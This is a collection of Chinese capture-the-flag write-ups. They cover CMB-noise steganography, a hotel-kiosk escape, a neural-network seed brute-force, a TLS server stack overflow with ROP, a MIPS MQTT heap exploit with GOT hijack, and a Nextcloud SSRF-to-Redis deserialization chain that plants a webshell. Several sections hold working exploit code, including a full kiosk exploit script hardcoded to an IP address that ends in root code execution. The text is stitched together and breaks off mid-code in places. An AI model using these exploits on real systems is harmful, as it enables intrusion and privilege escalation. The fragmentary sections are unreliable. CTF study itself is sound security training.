宇宙微波背景辐射

题目

老式电视机在没有信号时，屏幕上会出现密密麻麻的雪花这些静电干扰大部分来自于地球和地面，但是其中约有 1% 来自宇宙微波背景辐射——那是宇宙诞生约 38 万年后留下的第一缕“光”。天文学家通过极其敏感的仪器绘制这 1% 的微弱信号成为CMB图，用它测量宇宙学参数、研究天体物理和宇宙演化。小的时候曾经看着总是找不到信号的电视机，试图从那雪花中看出来点什么名堂，孩童时期的我们只能通过想象力来寻找那雪花中的图像，不过或许这杂乱无章的白噪声中，真的残余了什么秘密

题解

附件是一个 631 MB 的 mkv（PBS 纪录片 + 6 组”雪花噪声”图像序列）。隐藏信息不在空域也不在像素统计里，而在帧间相关性通道：被隐藏蒙版覆盖的像素会以一定概率与上一帧同值 (只有 lag-1 有信号)。对每组噪声算”相邻帧一致率 − 0.5″，200 对累积后隐藏图显形， 得到 6 段文字，按附件名 g2/g4 给出的编号拼回 flag。

  • 时间平均：把 200 帧平均，任何一组的密度图 std=0.03539，与二项分布理论值 0.03533 一致 → 空域无图。
  • 帧内统计：每帧白点数 mean≈269700、sd≈400（二项 359.7），自相关≈0 → 无每帧密度通道。
  • 帧间一致性（关键）：mean_i[frame_i == frame_{i+1}] − 0.5 存在结构化超标， 且只有 lag-1（lag1 excess≈0.00188，lag2≈0.00005，lag3+≈0）——说明隐藏蒙版 让”相邻两帧在这些像素上同源”，而 lag≥2 立刻解耦。

单像素信噪比只有 ~1.4σ，但文字是大字（约 130 px 高），所以直接渲染 map 就能读。

顺便也被 114 个”边缘像素”印证：它们取了 {8, X, 250−X, 242} 四值（≈25% 各）， 即 blend(noise1, noise2, α)，α∈{0.004…0.44}——这是蒙版边缘的抗锯齿，蒙版内部 α=1 所以完全隐形。

solve_cmb.py 一次抽出六组载体、算 map、渲染 work/g1..g6_hidden.png，并做可选校验。

g1 = 视频轨 0:2 前 200 帧   f1a9{S
g2 = g2.tar                3cr3t_     <- 附件名就是编号
g3 = 视频轨 0:2 后 200 帧   0f_cM6_
g4 = g4.tar                h1dd3n_    <- 附件名就是编号
g5 = 字幕轨 200 张 hex→PNG  1n51d3_
g6 = 主视频 1031~1039s 雪花  5tr34m}

排序关键：g2.tar/g4.tar 的编号直接给出第 2、4 段；{ 落在 g1、} 落在 g6 固定首尾； 剩 0f_cM6_、1n51d3_ 分给 #3/#5，只有一种排列成句 （”Secret of CMB, hidden inside the stream”）。不能按”句子读起来顺”自行排序—— 先按语义拼成 ...3cr3t_h1dd3n_1n51d3_0f_cM6_5tr34m 会失败。

字体经三段已知文本反推为 Impact（三组宽度预测误差 ≤4 px），可用于逐段模板校验 （--ocr）。注意：单字符层面 5/S/s、6/b/B 的打分只差 0.003~0.02，约 1σ， 所以模板匹配只作交叉验证，最终字形按渲染图人工确认。

完整脚本

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""宇宙微波辐射 - 一键解题（从 mkv 到 flag）"""
import os, sys, glob, subprocess, tarfile
import numpy as np
from scipy import ndimage
from scipy.signal import fftconvolve
from PIL import Image, ImageDraw, ImageFont

MKV, WORK = 'cmb.mkv', 'work'
FONT = 'C:/Windows/Fonts/impact.ttf'
os.makedirs(WORK, exist_ok=True)

def run(*cmd):
    subprocess.run(cmd, check=False,
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# ---------------------------------------------------------------- 载体抽取
def dump_attachments():
    for i, name in ((0, 'g2.tar'), (1, 'g4.tar')):
        p = os.path.join(WORK, name)
        if not os.path.exists(p):
            run('ffmpeg', '-y', '-dump_attachment:t:%d' % i, p, '-i', MKV)

def untar(name):
    """tar 内还套了一层同名目录：g2.tar -> g2/g2/000000.png"""
    d = os.path.join(WORK, name[:-4])
    pat = d + '/**/*.png'
    if len(glob.glob(pat, recursive=True)) < 200:
        os.makedirs(d, exist_ok=True)
        with tarfile.open(os.path.join(WORK, name)) as t:
            t.extractall(d)
    return sorted(glob.glob(pat, recursive=True))

def subtitle_pngs():
    d, srt = os.path.join(WORK, 'srt'), os.path.join(WORK, 'subs.srt')
    if len(glob.glob(d + '/*.png')) == 200:
        return sorted(glob.glob(d + '/*.png'))
    os.makedirs(d, exist_ok=True)
    if not os.path.exists(srt):
        run('ffmpeg', '-y', '-i', MKV, '-map', '0:3', srt)
    raw = open(srt, encoding='utf-8', errors='ignore').read().replace('\r', '')
    for blk in raw.split('\n\n'):
        lines = [l for l in blk.strip().split('\n') if l.strip()]
        if not lines:
            continue
        body = ''.join(l.strip() for l in lines
                       if not l.strip().isdigit() and '-->' not in l)
        if body and len(body) % 2 == 0:
            n = len(glob.glob(d + '/*.png'))
            open(os.path.join(d, '%06d.png' % n), 'wb').write(bytes.fromhex(body))
    return sorted(glob.glob(d + '/*.png'))

def raw_frames(tag, args, H, W):
    f = os.path.join(WORK, tag + '.gray')
    if not os.path.exists(f) or os.path.getsize(f) == 0:
        run(*(args + ['-f', 'rawvideo', '-pix_fmt', 'gray', f]))
    a = np.fromfile(f, dtype=np.uint8)
    n = len(a) // (H * W)
    return a[:n * H * W].reshape(n, H, W)

# ------------------------------------------- 核心：帧间一致性 → 隐藏图
def hidden_map(frames, sigma=2.0):
    """lag-1 一致率 − 0.5；被蒙版覆盖的像素为正"""
    b = frames > 125
    acc = np.zeros(b.shape[1:], dtype=np.int32)
    for i in range(len(b) - 1):
        acc += (b[i] == b[i + 1])
    return ndimage.gaussian_filter(
        (acc / (len(b) - 1)).astype(np.float32) - 0.5, sigma)

def save_png(m, path, lo=20, hi=99.5):
    a, b = np.percentile(m, [lo, hi])
    q = np.clip((m - a) / (b - a + 1e-9), 0, 1)
    Image.fromarray((q * 255).astype(np.uint8)).save(path)

# ------------------------------------- 可选：Impact 模板匹配校验（字体已反推）
def render(txt, H, W, size):
    img = Image.new('L', (W, H), 0)
    ImageDraw.Draw(img).text((W // 2, H // 2), txt, fill=255,
                             font=ImageFont.truetype(FONT, size), anchor='mm')
    return np.asarray(img, np.float32) / 255.

def best_ocr(m, cands, sizes):
    H, W = m.shape
    mz = m - m.mean(); nm = np.sqrt((mz ** 2).sum()); out = []
    for txt in cands:
        best = -9.0
        for s in sizes:
            t = render(txt, H, W, s); t -= t.mean()
            nt = np.sqrt((t ** 2).sum())
            if nt > 1e-6:
                best = max(best, float(fftconvolve(
                    mz, t[::-1, ::-1], mode='same').max() / (nm * nt)))
        out.append((best, txt))
    return sorted(out, reverse=True)

CAND = {
 'g1': ['f1a9{S', 'f1a9{5', 'f1a9{s'],
 'g2': ['3cr3t_', '3cr3t', '5cr3t_'],
 'g3': ['0f_cM6_', '0f_cMB_', '0f_cmb_'],
 'g4': ['h1dd3n_', 'h1dd3n', 'hidd3n_'],
 'g5': ['1n51d3_', '1n51d3', '1n5ld3_'],
 'g6': ['5tr34m}', 'Str34m}', 'str34m}'],
}
TEXT = {'g1': 'f1a9{S', 'g2': '3cr3t_', 'g3': '0f_cM6_',
        'g4': 'h1dd3n_', 'g5': '1n51d3_', 'g6': '5tr34m}'}

def main():
    dump_attachments()
    g2, g4 = untar('g2.tar'), untar('g4.tar')
    srt = subtitle_pngs()
    v2   = raw_frames('v2',   ['ffmpeg', '-y', '-i', MKV, '-map', '0:2'], 720, 1280)
    tail = raw_frames('tail', ['ffmpeg', '-y', '-ss', '1031.25', '-i', MKV,
                               '-map', '0:0', '-t', '8.05'], 720, 1280)
    load = lambda ps: np.stack([np.asarray(Image.open(p).convert('L')) for p in ps])
    groups = {'g1': v2[:200], 'g2': load(g2), 'g3': v2[200:400],
              'g4': load(g4), 'g5': load(srt), 'g6': tail}
    maps = {}
    for k in ('g1', 'g2', 'g3', 'g4', 'g5', 'g6'):
        maps[k] = hidden_map(groups[k])
        save_png(maps[k], os.path.join(WORK, k + '_hidden.png'))
    if '--ocr' in sys.argv:
        for k, m in maps.items():
            H, W = m.shape
            sizes = range(190, 250, 4) if W == 1280 else range(150, 190, 4)
            for v, txt in best_ocr(m, CAND[k], sizes)[:2]:
                print('%s  %-9s corr=%.4f' % (k, txt, v))
    flag = ''.join(TEXT[k] for k in ('g1', 'g2', 'g3', 'g4', 'g5', 'g6'))
    print('[+] flag: %s' % flag)

main()

题目

酒店的大堂自助入住机疑似存在漏洞，请你展开调查。VNC 密码：123qwe123。flag 在 /root/flag.txt。

题解

解题思路

  1. TOTP 泄露（应用层）：入住机”手机动态码验证”页的绑定二维码内容为 otpauth://totp/0perator:KIOSK-07?secret=<BASE32>，终端屏幕上直接暴露了运营商动态令牌种子，用标准 TOTP 算法就能生成 6 位码通过校验。
  2. kiosk 逃逸（系统层）：kiosk 跑在 XFCE 全屏桌面里，启动脚本只禁用了 <Ctrl><Alt>t、<Alt>F2、<Super> 等快捷键；Super+E 仍能打开 Thunar，在 Thunar 里右键 → Open Terminal Here 拿到 kiosk 用户 shell（uid=1000）。
  3. 组件签名绕过（提权）：root 进程 /opt/0perator/device_manager/manager.py 通过 system D-Bus（org.operator.DeviceManager）加载设备组件。python 组件签名只覆盖 id|version|vendor，不覆盖 entry 代码文件；且当 /run/0perator/face.status 为 disabled 时，用户可写目录里同 id 的组件会以 user-override 被 root 加载 → 复制合法 manifest、替换 face.py、D-Bus 触发重载即可 root 任意代码执行。

#!/usr/bin/env python3
"""Hotel kiosk CTF full solve: VNC -> QR TOTP leak -> Thunar shell -> root via component override."""
import base64, hashlib, hmac, re, struct, subprocess, sys, time
from pathlib import Path
import zxingcpp
from PIL import Image

TARGET = sys.argv[1] if len(sys.argv) > 1 else "39.106.53.101:24594"
VNC_PASS = "123qwe123"
SHOT = Path("shot.png")

def vnc(*args):
    cmd = ["vncdo", "-s", TARGET, "-p", VNC_PASS, "--force-caps"] + [str(a) for a in args]
    subprocess.run(cmd, check=False, capture_output=True)

def shot(path=SHOT):
    vnc("pause", "0.3", "capture", str(path))
    return path

def open_qr_secret():
    shot()
    for r in zxingcpp.read_barcodes(Image.open(SHOT)):
        m = re.search(r"secret=([A-Z2-7]+)", r.text)
        if m:
            return m.group(1)
    raise SystemExit("otpauth QR not found")

def totp(secret):
    key = base64.b32decode(secret + "=" * ((8 - len(secret) % 8) % 8))
    counter = int(time.time()) // 30
    h = hmac.new(key, struct.pack(">Q", counter), hashlib.sha1).digest()
    o = h[-1] & 0x0F
    return str((struct.unpack(">I", h[o:o + 4])[0] & 0x7FFFFFFF) % 1000000).zfill(6)

def login(secret):
    # 动态码输入框坐标 (530, 667)，然后 Enter 提交
    vnc("move", 530, 667, "click", 1, "pause", "0.3",
        "key", "ctrl-a", "pause", "0.2", "key", "del", "pause", "0.2",
        "type", totp(secret), "pause", "0.3", "key", "enter", "pause", "1.5")

def escape_to_shell():
    # Super+E 拉起 Thunar（启动脚本没禁用它）
    vnc("key", "super-e", "pause", "1.5")
    # 左键激活窗口（第一次点击会被吞掉），右键出菜单，再点 "Open Terminal Here"
    vnc("move", 500, 450, "click", 1, "pause", "0.3",
        "click", 3, "pause", "0.8",
        "move", 590, 543, "click", 1, "pause", "1.5")

def run_in_terminal(script):
    b64 = base64.b64encode(script.encode()).decode()
    vnc("move", 300, 400, "click", 1, "pause", "0.5")
    vnc("type", f"clear; echo {b64} | base64 -d > /tmp/x.sh; sh /tmp/x.sh",
        "pause", "0.2", "key", "enter", "pause", "3")

EXPLOIT = r'''#!/bin/sh
# 1) 激活 field-service override
printf 'disabled\n' > /run/0perator/face.status

# 2) 复制 vendor 合法签名 manifest，只替换 entry 指向的代码文件
mkdir -p /var/lib/0perator/components/user/face
cp /usr/share/0perator/components/face/manifest.json \
   /var/lib/0perator/components/user/face/manifest.json
cat > /var/lib/0perator/components/user/face/face.py <<'PYEOF'
import os
os.system('cp /root/flag.txt /tmp/f; chmod 644 /tmp/f')
PYEOF

# 3) 让 root 设备管理器重载组件（user-override -> root 代码执行）
gdbus call --system --dest org.operator.DeviceManager \
  --object-path /org/operator/DeviceManager \
  --method org.operator.DeviceManager1.ReloadComponents >/dev/null

# 4) 读取 flag
echo "FLAG: $(cat /tmp/f)"
'''

if __name__ == "__main__":
    secret = open_qr_secret()
    print("[+] TOTP secret in QR:", secret)
    login(secret)
    escape_to_shell()
    run_in_terminal(EXPLOIT)
    shot(Path("flag.png"))
    print("[+] done, flag printed in terminal -> flag.png")

题目

本题含有少量人工神经元，运输过程中可能出现沉淀

使用前请充分摇匀

如出现头晕、眼花、脱发或开始质疑自我，均属正常现象。请勿停止做题，以免前功尽弃

本品最终解释权归脑子所有

题解

附件给了同一网络的“正常版”model_A.npz 与“运输途中沉淀版”model_B.bin： 目标是恢复隐层神经元的洗牌排列。model_B.bin 是被 keystream 整体加密的高熵字节流， 读不出内容；但 check.py 只校验排列串，且 flag 就是该排列串的哈希，因此它是一个 离线 oracle —— 直接按作者惯用的日期型种子爆破 default_rng(seed).permutation(48/40/32)，命中即得 flag。

Step 1: 认清目标 —— 要还原的是“排列”，不是模型输出

model_A.npz 共 5384 个 float64 参数，形状为 k1(16,32) k5(48,32) k2(40,48) k6(32,40) 加四个偏置 k0(16) k3(48) k4(40) k7(32)，即网络 32 → 48 → 40 → 32 → 16，三个隐层 正好对应三组排列长度 48 / 40 / 32。

题面“含有少量人工神经元”是实话：48 个隐神经元的入权重只有 14 种不同取值、40 个只有 12 种、32 个只有 10 种，且偏置的类标号与入权重逐位置一致（同类神经元大量重复）。 所以“按权重值排序反推原顺序”这条路不成立——同类神经元可互换，必须拿到真正的洗牌排列。

model_B.bin 长度和 model_A.npz 完全相同（都是 44982 字节，同结构未压缩 npz），但字节熵 7.997 bit/byte、没有 PK / NUMPY 明文特征 → 它是被 keystream 整体加密的，密钥不在附件里 （试过日期/小整数种子 + 8 种 numpy default_rng/RandomState/random.Random 的 keystream 变体， 0..2M 种子无果）。所以不解模型 B。

Step 2: 用 check.py 当 oracle 爆破洗牌种子

check.py 的校验完全离线：

canon = ";".join(",".join(str(int(v)) for v in s.split(",")) for s in text.split(";"))
body  = sha256(canon).hexdigest()[:32]
assert sha256(("ns::" + body).hexdigest()) == V     # V 是硬编码的 sha256

也就是说：只要能给出通过校验的排列串，flag 就自动出来了。作者洗牌的写法是 np.random.default_rng(seed) 依次 permutation(48)、permutation(40)、permutation(32)， 于是遍历日期型种子 YYYYMMDD 即可（9803 个，0.5 秒扫完，区间内唯一命中 20261102）。

#!/usr/bin/env python3
"""neuron_shuffle 完整解题脚本：从附件到 flag。"""
import datetime
import hashlib
import numpy as np

NPZ   = r"C:\Users\Lufer\Downloads\neuron_shuffle_8a803e935e33df360a9e1e1976d567c5\neuron_shuffle\model_A.npz"
BIN   = r"C:\Users\Lufer\Downloads\neuron_shuffle_8a803e935e33df360a9e1e1976d567c5\neuron_shuffle\model_B.bin"
HIDDEN = (48, 40, 32)                                  # 三个隐层的神经元个数
V = "cf8303ef7e9fc6f51baf27b6e2c8763bd199a0a24c5294bcdaca3ddef6e47864"   # check.py 里的目标值


def perms_for_seed(seed):
    """作者洗牌写法：同一个 Generator 依次 permutation(48/40/32)，0 基、正向。"""
    rng = np.random.default_rng(seed)
    return ";".join(",".join(map(str, rng.permutation(n).tolist())) for n in HIDDEN)


def flag_of(answer):
    """复刻 check.py：排列串 -> flag body。不符则返回 None。"""
    body = hashlib.sha256(answer.encode()).hexdigest()[:32]
    return body if hashlib.sha256(("ns::" + body).encode()).hexdigest() == V else None


# 0. 附件自检：模型结构 + 少量人工神经元（说明为什么必须找排列而不是排序）
d = np.load(NPZ)
print("参数总数 =", sum(d[k].size for k in d.files),
      "| 隐层 =", HIDDEN,
      "| 隐层不同神经元数 =",
      [len({d[w][i].tobytes() for i in range(d[w].shape[0])})
       for w in ("k5", "k2", "k6")])
b = open(BIN, "rb").read()
hist = np.bincount(np.frombuffer(b, dtype=np.uint8), minlength=256) / len(b)
print("model_B.bin 长度 =", len(b), "| 熵 = %.3f" % (-(hist[hist > 0] * np.log2(hist[hist > 0])).sum()),
      "-> keystream 加密，不可读\n")

# 1. 日期型种子爆破 default_rng(seed).permutation(48/40/32)，用目标哈希验
day, end = datetime.date(2000, 1, 1), datetime.date(2030, 12, 31)
for i in range((end - day).days + 1):
    seed = int((day + datetime.timedelta(days=i)).strftime("%Y%m%d"))
    answer = perms_for_seed(seed)
    body = flag_of(answer)
    if body:
        print("[+] seed =", seed)
        print("[+] 排列(48/40/32) =", answer)
        print("[+] flag = flag{%s}" % body)
        open("answer.txt", "w").write(answer + "\n")
        break
else:
    print("[-] 未命中")

1、三个回调 + 一个全局变量“长度混搭”

三个回调共用 0x970f40…0x970f68 的全局：

char *g_p40; int g_len48;   // 0x970f40 / 0x970f48   —— PSK identity 拷贝
char *g_p50; int g_len58;   // 0x970f50 / 0x970f58   —— SNI 拷贝

① SNI 回调（0x40320a）

const char *name = SSL_get_servername(ssl, TLSEXT_NAMETYPE_host_name);
if (!name || !*name) { g_len58 = 0; g_p50 = NULL; return SSL_TLSEXT_ERR_NOACK; }

OpenSSL 侧限制：SNI 长度 ≤ 255、且不能含 0 字节（TLSEXT_MAXLEN_host_name/PACKET_contains_zero_byte）， 所以 g_len58 ≤ 255。

② psk_find_session_cb（0x402dbb）

注意 strlen(identity) == 0x20 只需要前 33 字节满足 magic + '\0'，identity_len 可以远大于 32 —— 于是 g_p40 是一块大小、内容全由攻击者决定的堆缓冲区。

③ info 回调（0x4030d5）

void info_cb(const SSL *ssl, int where, int ret) {
    if (where & 0x2002) {          // SSL_CB_ACCEPT_LOOP(0x2001) / ACCEPT_EXIT(0x2002)

        }

    }
}

void log_error(void) {                         // 0x40304d
    char buf[0x50];                            // rbp-0x60，canary 在 rbp-8
    memset(buf, 0, 0x50);
    memcpy(buf, g_p60, g_len68);               // ← 长度检查对象 ≠ 拷贝对象
    fprintf(stderr, "%s error\n", buf);
}

漏洞一句话：alert 分支走 g_p40 时只检查 g_len48 == 0x20，但 memcpy 的长度是 已被 SNI 分支改写的 g_len68 = strlen(SNI)（≤255），源指针是 PSK identity 副本 g_p40。于是得到一个长度可控（由 SNI 决定）、内容可控（由 PSK identity 决定）的栈溢出：

栈布局（log_error）：  buf[0x50] | pad | canary(rbp-8) | saved rbp(rbp) | ret(rbp+8) | ...
                      偏移 0x00                      0x58             0x60          0x68

溢出上限 255 字节，足够覆盖 canary + saved rbp + ret + 约 8 个 gadget 地址。

2、 触发条件：先制造一次 HelloRetryRequest

坑点：0x2002 分支只在状态机每次迭代时触发，而 SNI/PSK 回调是在本次迭代解析 CH 时 才执行的；如果 PSK 直接放在第一个 ClientHello 里，binder 校验失败 → 立刻发 alert， 此时 g_len68 仍是 0，不会溢出。必须在 alert 之前让 g_len68 = strlen(SNI) 先落地。 最干净的办法是 HelloRetryRequest：

  1. ClientHello#1：supported_versions=TLS1.3，supported_groups=[0x1234, 0x001d]， key_share 只给服务器不支持的组 0x1234（结构合法，32 字节任意值），SNI = "A"*S （S ≤ 255 → 发给服务器的 SNI 是 255 个 'A'）。 → 服务器回 HRR（ServerHello.random 为固定值 cf21ad74…a8339c）。 这一轮里 SNI 回调置 g_len58=S，随后的 ACCEPT_EXIT 事件把 g_len68=S 固化下来。
  2. 4、爆破 Stack Canary（fork 型服务 + 长度可控的 memcpy）

  • 溢出长度 = strlen(SNI) = S。把 S 设为 0x58 + k，就只覆盖 canary 的前 k 字节， 其余 8-k 字节保持内核给出的原值。猜对 → canary 校验通过 → log_error 正常返回 → info_cb 继续执行 send(fd, "error", 5)，我们在 TLS 连接上收到明文 error； 猜错 → __stack_chk_fail → 子进程直接消失，只会收到 alert、收不到 error。
  • 服务是自己 bind 端口并 fork 的常驻进程，父进程的 canary 被子进程继承， 所有连接 canary 相同，因此可以逐字节爆破（glibc 最低字节固定 0x00，7×256 次最坏； 多线程并发约 2 分钟）。

4、两阶段 ROP（溢出只有 255 字节）

静态非 PIE ⇒ 所有 gadget 地址固定。选用的 gadget：

  • Stage 1（放在溢出里，长度刚好 0x58 + 0x68 = 0xC0）： read(4, 0x972000 /* .bss */, 0x800)，随后 pop rsp; ret -> 0x972000 完成栈迁移。
  • Stage 2（触发后延迟 0.15 s 再发；此时 ROP 的 read 已阻塞，避免被 OpenSSL 记录层读进自己的缓冲）：dup2(4,0/1/2) → execve("/bin/sh", argv, NULL)。 二进制里没有 /bin/sh 字符串（system/popen 未被链接进来），所以把 /bin/sh\0 和 argv 数组一起写进 .bss。

细节：

  • 客户端 socket fd = 4：socket() 拿 3、accept() 拿 4，子进程在 SSL_accept 前 close(listenfd)；先用单阶段 write(4, "TLS_AES...", 4) 实测在 TLS 连接上收到明文 TLS_，确认 ROP 可控且 fd 正确。
  • read(4, …) 一次只能拿到“当前已到达”的字节，所以 stage2 必须在收到 alert 之后再发， 且整个 blob（304 字节）一次 sendall 发出，保证一次 read 全量读入。

解题思路

一个 MIPS64 大端 MQTT 服务（PIE + uClibc 1.0.32 dlmalloc，跑在 qemu-mips64-static 下）。 四个漏洞串起来：用户名比较的长度截断 strncmp 绕过认证、news 回声的 UAF 泄漏堆地址、 广播组包时 16 位截断导致的 64 KiB 堆溢出，以及被改写后的 entry 表把 PUBLISH 的 “复用缓冲区” 分支变成任意地址写。最终不需要栈溢出：用假 chunk + unsorted bin 从 broadcast 回显里拿到 libc，再 GOT[__libc_free] = system，用 grow 路径的 free("/bin/sh") 起 shell。

Step 1: 静态/动态侦察得到协议与三处关键地址关系

file server：ELF64 MIPS big-endian, PIE, 动态链接 libuClibc-1.0.32.so；2283/2883 端口对外 （笔记里 1883 拒连，2883 是同一实例）。用自建的 unicorn 模拟器（含 uClibc 重定位 + Linux syscall 模拟）把 server + libuClibc 跑起来，可以带 malloc/free 返回值和 mstate/bins 转储调试。

协议要点（PIE 相对地址）：

  • 帧头 type + varint(len)，body 结构各自解析；F_226c 算 payload_len， payload = buf + (u8)(h + tlen + 3)（截断到 1 字节）。
  • 状态结构 state = *(PIE+0x20330)，16 字节：[0]=carry, [1]=auth, [2]=news, [3]=ping计数。
  • entry 表 PIE+0x20338，14 项 × 0x20：topic(8) / len(2) / buf(8)+0x10 / size(2)+0x18。
  • reader F_439c：缓冲在 fp+0x30，carry = state[0]， read(0, buf+carry, 5-carry)（carry≥5 时 count 变成巨大值），帧尾 limit L ≤ 0x1800b， 保护寄存器在 fp+0x18058/0x18060/0x18068。

三个”常量”关系（远程实测/推导，全部经验证）：

  • heap = leak - 0xf0（news 回声读出的空闲 topic chunk 地址）
  • pie = heap - 0x22000：镜像 p_memsz 到 0x20540，qemu-user 把 brk 放到页对齐后的 0x21000，再加一页 → 0x22000。（用 xpie.py 写的 oracle 唯一确认：把 pop#1 的 *(F+0x10) = bin_at 精确指向 entry[0].len，只有真实 pie 才会让 news 广播消失且进程存活。）
  • 远程堆布局 = 本地模拟器布局 +0x70（stdio FILE chunk 先占掉 0x70）
Step 2: 三个漏洞 → 一条”任意写”链
  1. 认证绕过：用户名比较是 strncmp(xor(user), "LJ_/-/+B\ypts", user_len)，user_len 来自 帧里我们给的长度；只发 1 字节 'Q'（'Q'^0x1d='L'）即可通过。
  2. 堆泄漏：订阅两个 32 字节 topic 再退订，然后 PUBLISH QWB2026_News <32B>。 F_37d8 在 entry->size < 33 时先 free(entry->buf) 再组包广播，于是把 freed chunk 的 fastbin fd 原样回显 → 堆指针。
  3. 64 KiB 溢出：广播组包 F_2610 里 p3 = malloc((u16)(hdrbytes + hdr_len + payload_len))，拷贝却是 payload_len。 payload_len = 65520 时 total3 = (u16)(2+16+65520) = 2 → malloc(2) + 64 KiB 拷贝， 而且 p3 恰好是 0x20 类的第三次 malloc（落点很低），溢出从 p3+18 覆盖整个堆。
  4. 任意 malloc 返回 → entry 表改写：dlmalloc 的 small-bin pop 不检查： bin->bk = victim->bk; *(victim->bk + 0x10) = bin_at; return victim+0x10。 把 victim->bk 改成 F，下一次同类 malloc 就返回 F+0x10。 于是两次 0x50 类 malloc（pop victim → pop F）让 PUBLISH 的 store malloc 返回 &entry[11]+8，store 的 memset+memcpy 直接把 entry 表改写成 {len=24, buf=目标, size=8}。
  5. 任意写：条目被改写后再 PUBLISH 到该 topic，F_3a34 走 entry->size >= payload_len 的 复用分支：memset(entry->buf,0,size); memcpy(entry->buf,payload,pl) —— 目标地址 完全由我们决定，长度最多 64 KiB。
Step 3: 不碰栈，直接偷 libc 并劫持 GOT

栈溢出那条路（carry≥5 的巨型 read）需要单次 read 拿到 ~98 KB，而 RTT≈57 ms， 服务器会在第一段 TCP 到达时就返回，永远覆盖不到 fp+0x18068。于是改走：

  • 假 chunk 偷 libc：在一条我们完全控制的 200 字节缓冲区里伪造一个 chunk （size=0x61，并伪造”下一个 chunk 在用”以跳过合并）。用 0x30 类的 double-pop 让 store malloc 返回它，entry[0].buf = FAKE+0x10 且 size=32 < 33，于是 F_37d8 立刻 free() 这个假 chunk → dlmalloc 把它链进 unsorted bin，把 mstate 指针写进 FAKE+0x10/0x18；紧接着的 broadcast 从同一地址拷 32 字节发给客户端 → libc = leaked_word - 0xc2d48（bin0 伪 chunk 偏移）。
  • GOT 劫持：再走一次 0x50 类 double-pop 把 entry[11].buf 改成 &GOT[__libc_free]、 size=8，PUBLISH 8 字节 = system → GOT[__libc_free] = system。
  • 触发：先 PUBLISH '/bin/sh\0' 让 entry[1].buf 内容就是命令字符串，再 PUBLISH 一个 更大的 payload 走 grow 分支：free(旧缓冲区) → system("/bin/sh") → 拿到 shell， cat /flag*。

题目

题解

核心手法：/flag.php 会给自己泄漏源码，暴露一个支持 gopher:// 的 SSRF；用它打本机 Redis， 而 Nextcloud 把 PHP session 存在 Redis 里，PHP 解析 session 时会对每个 value 做 unserialize —— 于是可以注入一个对象，用 GuzzleHttp\Cookie\FileCookieJar::__destruct() 落地任意文件写， 覆写一个 web 可达的 .php 拿到 RCE，最后读 /flag。

Step 1：/flag.php 源码自泄漏，确认唯一的攻击面

直接访问 /flag.php（无 cookie、非本机来源）会走 highlight_file(__FILE__) 把自己印出来： 一个旗标分支（要求 REMOTE_ADDR ∈ {127.0.0.1,::1} + preg_match('#^qwb2026#i', UA) + 无 X-Forwarded-For 等头） 外加一个 curl 的 SSRF，协议不受限、CURLOPT_TIMEOUT=5。

用空的 gopher payload 当时间探测（开放连接会挂满 5s，端口关闭 0.3s 就返回）扫内网， 只有 127.0.0.1:80 和 127.0.0.1:6379 响应 —— 88/8080/自定义端口全都不存在：

拿到 Redis 后注意它是被硬化过的（CONFIG/KEYS/SCAN/RANDOMKEY/FLUSHALL/MODULE/DEBUG 全禁、Lua 无 io/os.execute）， 所以不能打常规 Redis RCE，只能”读/写它存的东西”。

Step 2：Nextcloud 的 session 存在 Redis，而 PHP 会反序列化 session 值

/login 返回的 cookie oc<instanceid> 就是 PHP 的 session id，服务端数据在 PHPREDIS_SESSION:<sid>：

GET PHPREDIS_SESSION:c986ef4a6706b52860cb7a773ede713b
-> encrypted_session_data|s:388:"<hex ct>|<hex iv>|<hmac>|3";

这个 blobs 由 Nextcloud 的 CryptoWrapper 用 oc_sessionPassphrase cookie 派生密钥加密（HKDF-SHA512 → PBKDF2-HMAC-SHA1(salt=phpseclib) → AES-128-CBC + HMAC-SHA512），伪造 user_id 是没用的， 因为每个请求还会拿 sid 去查 oc_authtoken。

真正的入口在外层：PHP 的 session 解码器对每个 value 都执行 php_var_unserialize()。 往 session 末尾追加一个对象，请求后它被完整实例化并回写，这就是对象注入点：

SET ... "pocx|O:8:\"stdClass\":0:{}"
GET /login                                        # session_start -> 解码
GET PHPREDIS_SESSION:...  ->  ...;pocx|O:8:"stdClass":0:{}    # 对象被保留 = 实例化成功

Step 3：Guzzle gadget 写文件 → RCE → /flag

Nextcloud 自带 Guzzle，GuzzleHttp\Cookie\FileCookieJar 在 __destruct() 里调用 save($this->filename) → file_put_contents($filename, json_encode($cookies), LOCK_EX)， 文件名和内容都由 cookie 的 data 决定，是标准的任意文件写 gadget。

Guzzle 写出来的是 JSON，PHP 只执行里面的 <?php ... ?> 段，所以文件内容是 [{"Name":"a","Value":"<?php ... ?>","HostOnly":false}] 也能当 webshell：

GET /status.php?1=id
-> uid=33(www-data) gid=33(www-data) groups=33(www-data)
GET /status.php?1=cat%20/flag
-> flag{...}

def _enc(*args):
    out = b"*%d\r\n" % len(args)
    for a in args:
        a = a if isinstance(a, bytes) else str(a).encode()
        out += b"$%d\r\n" % len(a) + a + b"\r\n"

def _parse(raw):
    pos = [0]

    def rd():
        if pos[0] >= len(raw):
            return ("EOF", None)
        tag = raw[pos[0]:pos[0] + 1]
        eol = raw.find(b"\r\n", pos[0])
        if eol < 0:
            return ("EOF", None)
        line, pos[0] = raw[pos[0] + 1:eol], eol + 2
        if tag == b"+":
            return line
        if tag == b"-":
            return ("ERR", line.decode("utf-8", "replace"))
        if tag == b":":
            return int(line)
        if tag == b"$":
            n = int(line)
            if n < 0:
                return None
            v = raw[pos[0]:pos[0] + n]
            pos[0] += n + 2
            return v
        if tag == b"*":
            n = int(line)
            return None if n < 0 else [rd() for _ in range(n)]
        return None

    out = []
    while pos[0] < len(raw):
        v = rd()
        if isinstance(v, tuple) and v[0] == "EOF":
            break
        out.append(v)
    return out

题目用 Python 实现了一套 Falcon 风格的后量子签名密钥生成（N = 128, q = 12289, sigma = 19.16）， 核心对象是 NTRU 密钥 (f, g, F, G)：系数取自离散高斯，h = g/f mod (q, x^N+1)，fG - gF = q。

程序随后做三件事：

vals, parts = expanded_doubles(key)          # 把 fft 值与整棵 falcon 采样树序列化成 3328 个 double
cblob = corrupt_blob(blob, rho=0.01, rho01=0.001)[8*128*8:]   # 污染后砍掉前 1024 个 double
ct    = flag XOR keystream(sha256(b"frozen:" + ",".join(map(str, D))))   # D = f·f* + g·g*
print("pubkey =", {"N","q","sigma","h","rho_hint"})
print("memory =", cblob.hex())               # 18432 B = 2304 个 double
print("flag   =", ct.hex())                  # 42 B 密文

